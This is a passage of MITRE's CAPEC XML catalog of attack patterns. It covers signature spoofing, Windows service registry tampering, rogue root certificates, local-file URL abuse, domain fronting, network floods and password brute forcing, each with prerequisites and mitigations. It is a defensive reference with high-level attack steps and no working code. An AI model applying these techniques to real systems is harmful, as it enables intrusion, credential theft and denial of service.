               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="474" Name="Signature Spoofing by Key Theft" Abstraction="Detailed" Status="Draft">
         <Description>An attacker obtains an authoritative or reputable signer's private signature key by theft and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="473"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An authoritative or reputable signer is storing their private signature key with insufficient protection.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Knowledge of common location methods and access methods to sensitive data</Skill>
            <Skill Level="High">Ability to compromise systems containing sensitive data</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Restrict access to private keys from non-supervisory accounts</xhtml:p>
               <xhtml:p>Restrict access to administrative personnel and processes only</xhtml:p>
               <xhtml:p>Ensure all remote methods are secured</xhtml:p>
               <xhtml:p>Ensure all services are patched and up to date</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="522"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-411"/>
            <Reference External_Reference_ID="REF-412"/>
            <Reference External_Reference_ID="REF-413"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="475" Name="Signature Spoofing by Improper Validation" Abstraction="Detailed" Status="Draft">
         <Description>An attacker exploits a cryptographic weakness in the signature verification algorithm implementation to generate a valid signature without knowing the key.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="473"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Recipient is using a weak cryptographic signature verification algorithm or a weak implementation of a cryptographic signature verification algorithm, or the configuration of the recipient's application accepts the use of keys generated using cryptographically weak signature verification algorithms.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Cryptanalysis of signature verification algorithm</Skill>
            <Skill Level="High">Reverse engineering and cryptanalysis of signature verification algorithm implementation</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Use programs and products that contain cryptographic elements that have been thoroughly tested for flaws in the signature verification routines.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="327"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="476" Name="Signature Spoofing by Misrepresentation" Abstraction="Detailed" Status="Draft">
         <Description>An attacker exploits a weakness in the parsing or display code of the recipient software to generate a data blob containing a supposedly valid signature, but the signer's identity is falsely represented, which can lead to the attacker manipulating the recipient software or its victim user to perform compromising actions.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="473"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Recipient is using signature verification software that does not clearly indicate potential homographs in the signer identity.Recipient is using signature verification software that contains a parsing vulnerability, or allows control characters in the signer identity field, such that a signature is mistakenly displayed as valid and from a known or authoritative signer.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Attacker needs to understand the layout and composition of data blobs used by the target application.</Skill>
            <Skill Level="High">To discover a specific vulnerability, attacker needs to reverse engineer signature parsing, signature verification and signer representation code.</Skill>
            <Skill Level="High">Attacker may be required to create malformed data blobs and know how to insert them in a location that the recipient will visit.</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Ensure the application is using parsing and data display techniques that will accurately display control characters, international symbols and markings, and ultimately recognize potential homograph attacks.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="290"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-414"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="477" Name="Signature Spoofing by Mixing Signed and Unsigned Content" Abstraction="Detailed" Status="Draft">
         <Description>An attacker exploits the underlying complexity of a data structure that allows for both signed and unsigned content, to cause unsigned data to be processed as though it were signed data.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="473"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Signer and recipient are using complex data storage structures that allow for a mix between signed and unsigned data</Prerequisite>
            <Prerequisite>Recipient is using signature verification software that does not maintain separation between signed and unsigned data once the signature has been verified.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">The attacker may need to continuously monitor a stream of signed data, waiting for an exploitable message to appear.</Skill>
            <Skill Level="High">Attacker must be able to create malformed data blobs and know how to insert them in a location that the recipient will visit.</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Ensure the application is fully patched and does not allow the processing of unsigned data as if it is signed data.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="693"/>
            <Related_Weakness CWE_ID="311"/>
            <Related_Weakness CWE_ID="319"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="478" Name="Modification of Windows Service Configuration" Abstraction="Detailed" Status="Usable">
         <Description>An adversary exploits a weakness in access control to modify the execution parameters of a Windows service. Specifically, if the permissions for users and groups are not properly assigned and allow access to the registry keys used to store the configuration information for a service, then an adversary could change settings defining the path to the executable and cause a malicious binary to be executed.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="203"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the capability to write to the Windows Registry on the targeted system.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>By altering specific configuration settings for the service, the adversary could run arbitrary code to be executed.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1058</Entry_ID>
               <Entry_Name>Service Registry Permissions Weakness</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-04-25</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="479" Name="Malicious Root Certificate" Abstraction="Detailed" Status="Stable">
         <Description>An adversary exploits a weakness in authorization and installs a new root certificate on a compromised system. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="473"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the ability to create a new root certificate.</Prerequisite>
         </Prerequisites>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1130</Entry_ID>
               <Entry_Name>Install Root Certificate</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-04-26</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="48" Name="Passing Local Filenames to Functions That Expect a URL" Abstraction="Detailed" Status="Draft">
         <Description>This attack relies on client side code to access local files and resources instead of URLs. When the client browser is expecting a URL string, but instead receives a request for a local file, that execution is likely to occur in the browser process space with the browser's authority to local files. The attacker can send the results of this request to the local files out to a site that they control. This attack may be used to steal sensitive authentication data (either local or remote), or to gain system profile information to launch further attacks.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="212"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identify web application URL inputs] Review application inputs to find those that are designed to be URLs.</Description>
               <Technique>Manually navigate web site pages to identify URLs.</Technique>
               <Technique>Use automated tools to identify URLs.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Identify URL inputs allowing local access.] Execute test local commands via each URL input to determine which are successful.</Description>
               <Technique>Manually execute a local command (such as 'pwd') via the URL inputs.</Technique>
               <Technique>Using an automated tool, test each URL input for weakness.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Execute malicious commands] Using the identified URL inputs that allow local command execution, execute malicious commands.</Description>
               <Technique>Execute local commands via the URL input.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The victim's software must not differentiate between the location and type of reference passed the client software, e.g. browser</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Attacker identifies known local files to exploit</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Implementation: Ensure all configuration files and resource are either removed or protected when promoting code into production.</Mitigation>
            <Mitigation>Design: Use browser technologies that do not allow client side scripting.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Perform output validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Disable scripting languages such as JavaScript in browser</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>J2EE applications frequently use .properties files to store configuration information including JDBC connections, LDAP connection strings, proxy information, system passwords and other system metadata that is valuable to attackers looking to probe the system or bypass policy enforcement points. When these files are stored in publicly accessible directories and are allowed to be read by the public user, then an attacker can list the directory identify a .properties file and simply load its contents in the browser listing its contents. A standard Hibernate properties file contains</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">hibernate.connection.driver_class = org.postgresql.Driver<xhtml:br/>hibernate.connection.url = jdbc:postgresql://localhost/mydatabase<xhtml:br/>hibernate.connection.username = username<xhtml:br/>hibernate.connection.password = password<xhtml:br/>hibernate.c3p0.min_size=5<xhtml:br/>hibernate.c3p0.max_size=20</xhtml:div>
               <xhtml:p>Even if the attacker cannot write this file, there is plenty of information to leverage to gain further access.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="241"/>
            <Related_Weakness CWE_ID="706"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-416"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description, Description Summary, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="481" Name="Contradictory Destinations in Traffic Routing Schemes" Abstraction="Detailed" Status="Draft">
         <Description>Adversaries can provide contradictory destinations when sending messages. Traffic is routed in networks using the domain names in various headers available at different levels of the OSI model. In a Content Delivery Network (CDN) multiple domains might be available, and if there are contradictory domain names provided it is possible to route traffic to an inappropriate destination. The technique, called Domain Fronting, involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. An alternative technique, called Domainless Fronting, is similar, but the SNI field is left blank.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="161"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An adversary must be aware that their message will be routed using a CDN, and that both of the contradictory domains are served from that CDN.</Prerequisite>
            <Prerequisite>If the purpose of the Domain Fronting is to hide redirected C2 traffic, the C2 server must have been created in the CDN.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The adversary must have some knowledge of how messages are routed.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Monitor connections, checking headers in traffic for contradictory domain names, or empty domain names.</Mitigation>
         </Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1172</Entry_ID>
               <Entry_Name>Domain Fronting - Command and Control</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2019-04-04</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="482" Name="TCP Flood" Abstraction="Standard" Status="Draft">
         <Description>An adversary may execute a flooding attack using the TCP protocol with the intent to deny legitimate users access to a service. These attacks exploit the weakness within the TCP protocol where there is some state information for the connection the server needs to maintain.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the ability to generate a large amount of TCP traffic to send to the target port of a functioning server.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To mitigate this type of an attack, an organization can monitor incoming packets and look for patterns in the TCP traffic to determine if the network is under an attack. The potential target may implement a rate limit on TCP SYN messages which would provide limited capabilities while under attack.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="485" Name="Signature Spoofing by Key Recreation" Abstraction="Detailed" Status="Draft">
         <Description>An attacker obtains an authoritative or reputable signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="473"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An authoritative signer is using a weak method of random number generation or weak signing software that causes key leakage or permits key inference.</Prerequisite>
            <Prerequisite>An authoritative signer is using a signature algorithm with a direct weakness or with poorly chosen parameters that enable the key to be recovered using signatures from that signer.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Cryptanalysis of signature generation algorithm</Skill>
            <Skill Level="High">Reverse engineering and cryptanalysis of signature generation algorithm implementation and random number generation</Skill>
            <Skill Level="High">Ability to create malformed data blobs and know how to present them directly or indirectly to a victim.</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Ensure cryptographic elements have been sufficiently tested for weaknesses.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="330"/>
            <Related_Weakness CWE_ID="310"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-419"/>
            <Reference External_Reference_ID="REF-420"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="486" Name="UDP Flood" Abstraction="Standard" Status="Draft">
         <Description>An adversary may execute a flooding attack using the UDP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. Additionally, firewalls often open a port for each UDP connection destined for a service with an open UDP port, meaning the firewalls in essence save the connection state thus the high packet nature of a UDP flood can also overwhelm resources allocated to the firewall. UDP attacks can also target services like DNS or VoIP which utilize these protocols. Additionally, due to the session-less nature of the UDP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the ability to generate a large amount of UDP traffic to send to the desired port of a target service using UDP.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To mitigate this type of an attack, modern firewalls drop UDP traffic destined for closed ports, and unsolicited UDP reply packets. A variety of other countermeasures such as universal reverse path forwarding and remote triggered black holing(RFC3704) along with modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="487" Name="ICMP Flood" Abstraction="Standard" Status="Draft">
         <Description>An adversary may execute a flooding attack using the ICMP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. A typical attack involves a victim server receiving ICMP packets at a high rate from a wide range of source addresses. Additionally, due to the session-less nature of the ICMP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the ability to generate a large amount of ICMP traffic to send to the target server.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To mitigate this type of an attack, an organization can enable ingress filtering. Additionally modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="488" Name="HTTP Flood" Abstraction="Standard" Status="Draft">
         <Description>An adversary may execute a flooding attack using the HTTP protocol with the intent to deny legitimate users access to a service by consuming resources at the application layer such as web services and their infrastructure. These attacks use legitimate session-based HTTP GET requests designed to consume large amounts of a server's resources. Since these are legitimate sessions this attack is very difficult to detect.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the ability to generate a large amount of HTTP traffic to send to a target server.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To mitigate this type of an attack, an organization can monitor the typical traffic flow. When spikes in usage occur, filters could examine traffic for indicators of bad behavior with respect to the web servers, and then create firewall rules to deny the malicious IP addresses. These patterns in the filter could be a combination of trained behavior, knowledge of standards as they apply to the web server, known patterns, or anomaly detection. Firewalling source IPs works since the HTTP is sent using TCP so the source IP can't be spoofed; if the source IP is spoofed is, then it's not legitimate traffic. Special care should be taken care with rule sets to ensure low false positive rates along with a method at the application layer to allow a valid user to begin using the service again. Another possible solution is using 3rd party providers as they have experts, knowledge, experience, and resources to deal with the attack and mitigate it before hand or while it occurs. The best mitigation is preparation before an attack, but there is no bulletproof solution as with ample resources a brute force attack may succeed.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="489" Name="SSL Flood" Abstraction="Standard" Status="Draft">
         <Description>An adversary may execute a flooding attack using the SSL protocol with the intent to deny legitimate users access to a service by consuming all the available resources on the server side. These attacks take advantage of the asymmetric relationship between the processing power used by the client and the processing power used by the server to create a secure connection. In this manner the attacker can make a large number of HTTPS requests on a low provisioned machine to tie up a disproportionately large number of resources on the server. The clients then continue to keep renegotiating the SSL connection. When multiplied by a large number of attacking machines, this attack can result in a crash or loss of service to legitimate users.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the ability to generate a large amount of SSL traffic to send a target server.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To mitigate this type of an attack, an organization can create rule based filters to silently drop connections if too many are attempted in a certain time period.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="49" Name="Password Brute Forcing" Abstraction="Standard" Status="Draft">
         <Description>In this attack, the adversary tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password. A system will be particularly vulnerable to this type of an attack if it does not have a proper enforcement mechanism in place to ensure that passwords selected by users are strong passwords that comply with an adequate password policy. In practice a pure brute force attack on passwords is rarely used, unless the password is suspected to be weak. Other password cracking methods exist that are far more effective (e.g. dictionary attacks, rainbow tables, etc.). Knowing the password policy on the system can make a brute force attack more efficient. For instance, if the policy states that all passwords must be of a certain level, there is no need to check smaller candidates.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="112"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine application's/system's password policy] Determine the password policies of the target application/system.</Description>
               <Technique>Determine minimum and maximum allowed password lengths.</Technique>
               <Technique>Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).</Technique>
               <Technique>Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Brute force password] Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.</Description>
               <Technique>Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.</Technique>
               <Technique>Perform an offline dictionary attack or a rainbow table attack against a known password hash.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An adversary needs to know a username to target.</Prerequisite>
            <Prerequisite>The system uses password based authentication as the one factor authentication mechanism.</Prerequisite>
            <Prerequisite>An application does not have a password throttling mechanism in place. A good password throttling mechanism will make it almost impossible computationally to brute force a password as it may either lock out the user after a certain number of incorrect attempts or introduce time out periods. Both of these would make a brute force attack impractical.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">A brute force attack is very straightforward. A variety of password cracking tools are widely available.</Skill>
         </Skills_Required>
         <Resources_Required>
